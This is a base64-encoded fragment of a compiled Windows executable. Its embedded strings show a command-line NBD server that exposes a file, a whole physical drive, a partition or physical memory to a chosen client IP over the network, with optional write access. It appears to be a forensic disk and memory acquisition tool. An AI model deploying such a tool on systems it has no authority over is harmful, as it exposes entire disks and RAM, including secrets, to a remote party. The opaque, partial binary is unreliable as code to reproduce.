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CBwYXJ0aXRpb25zACAtdyAgICAgRW5hYmxlIHdyaXRpbmcgKGRpc2FibGVkIGJ5IGRlZmF1bHQpAAAAACAtZCAgICAgRW5hYmxlIGRlYnVnIG1lc3NhZ2VzAAAAIC1xICAgICBCZSBRdWlldC4ubm8gbWVzc2FnZXMAAAAgLWggICAgIFRoaXMgaGVscCB0ZXh0AABbKl0gAAAAAFsrXSAAAAAAWy1dIAAAAABDb25uZWN0aW9uIGRyb3BwZWQuIEVycm9yOiAlbHUAAG9wZW5pbmcgbWVtb3J5AABvcGVuaW5nIGZvciB3cml0aW5nAAAAAABvcGVuaW5nIHJlYWQtb25seQAAAAAAAABFcnJvciBvcGVuaW5nIGZpbGUgJXM6ICV1AAAAAAAAAFxcLlxQSFlTSUNBTERSSVZFAAAAAAAAAENhbm5vdCBvYnRhaW4gZHJpdmUgbGF5b3V0OiAldQAAUmVxdWVzdCBubyBpbyBib3VuZGFyeSBjaGVja3MgZmFpbGVkLiBFcnJvcjogJXUAQm91bmRhcnkgY2hlY2tzIHR1cm5lZCBvZmYuAAAAAABEaXNrTGVuZ3RoOiAlbGxkAAAAAAAAAABDYW5ub3QgZGV0ZXJtaW5lIERpc2sgbGVuZ3RoLiBFcnJvcjogJXUAVGFyZ2V0aW5nIG9ubHkgcGFydGl0aW9uICVkAAAAAABQYXJ0aXRpb24gJWQgaXMgb2YgdHlwZSAlMDJ4AAAAAE9mZnNldDogJWxsZCAoJWxseCkAAAAAAExlbmd0aDogJWxsZCAoJWxseCkAXFwuXAAAAAAAAAAAVm9sdW1lTGVuZ3RoOiAlbGxkAAAAAAAAQ2Fubm90IGRldGVybWluZSBWb2x1bWUgbGVuZ3RoLiBFcnJvcjogJXUAAAAAAAAARmFpbGVkIHRvIHNldCBhY3F1aXNpdGlvbiBtb2RlLgBGYWlsZWQgdG8gZ2V0IG1lbW9yeSBnZW9tZXRyeS4AAENSMzogMHglMDEwbGxYICVkIG1lbW9yeSByYW5nZXM6AAAAAAAAAABTdGFydCAweCUwOGxsWCAtIExlbmd0aCAweCUwOGxsWAAAAAAAAAAARmFpbGVkIHRvIG9idGFpbiBmaWxlc2l6ZSBpbmZvOiAldQAAAAAAAE5lZ290aWF0aW5nLi4uc2VuZGluZyBOQkRNQUdJQyBoZWFkZXIAAABOQkRNQUdJQwAAAAAAAAAARmFpbGVkIHRvIHNlbmQgbWFnaWMgc3RyaW5nAAAAAABGYWlsZWQgdG8gc2VuZCAybmQgbWFnaWMgc3RyaW5nLgAAAAAAAAAARmFpbGVkIHRvIHNlbmQgZmlsZXNpemUuAAAAAAAAAABGYWlsZWQgdG8gc2VuZCBhIGNvdXBsZSBvZiAweDAwcwAAAAAAAAAAU3RhcnRlZCEAAAAAAAAAAEZhaWxlZCB0byByZWFkIGZyb20gc29ja2V0LgB3cml0ZToAAHJlYWQAAAAAAAAAAFJlcXVlc3Q6ICVzIEZyb206ICVsbGQgTGVuOiAlbHUgAAAAAAAAAABVbmV4cGVjdGVkIHByb3RvY29sIHZlcnNpb24hIChnb3Q6ICVseCwgZXhwZWN0ZWQ6IDB4MjU2MDk1MTMpAAAASW52YWxpZCByZXF1ZXN0OiBGcm9tOiVsbGQgTGVuOiVsdQAAAAAAAEZhaWxlZCB0byBzZW5kIGVycm9yIHBhY2tldCB0aHJvdWdoIHNvY2tldC4AAAAAAFRlcm1pbmF0aW5nIGNvbm5lY3Rpb24gZHVlIHRvIEludmFsaWQgcmVxdWVzdDogRnJvbTolbGxkIExlbjolbHUAAAAAAAAAAEVycm9yIHNlZWtpbmcgaW4gZmlsZSAlcyB0byBwb3NpdGlvbiAlbGxkICglbGx4KTogJXUAAAAAU2VuZGluZyBlcnJubz0lZAAAAAAAAAAARmFpbGVkIHRvIHNlbmQgZXJyb3Igc3RhdGUgdGhyb3VnaCBzb2NrZXQuAAAAAAAAcmVjdiBtYXggJWQgYnl0ZXMAAAAAAAAAV3JpdGVGaWxlICVkIGJ5dGVzIG9mICVkIGJ5dGVzIGluIGJ1ZmZlcgAAAAAAAAAARmFpbGVkIHRvIHdyaXRlICVkIGJ5dGVzIHRvICVzOiAldQAAAAAAAEJsb2NrIHNpemUgaW5jb25zaXN0ZW5jeTogJWQAAAAAQ29ubmVjdGlvbiB3YXMgZHJvcHBlZCB3aGlsZSByZWNlaXZpbmcgZGF0YS4AAAAARmFpbGVkIHRvIHNlbmQgdGhyb3VnaCBzb2NrZXQuAABTZW5kaW5nIHBhZDogJWxsZCwlZAAAAABTZW5kaW5nIG1lbTogJWxsZCwlZ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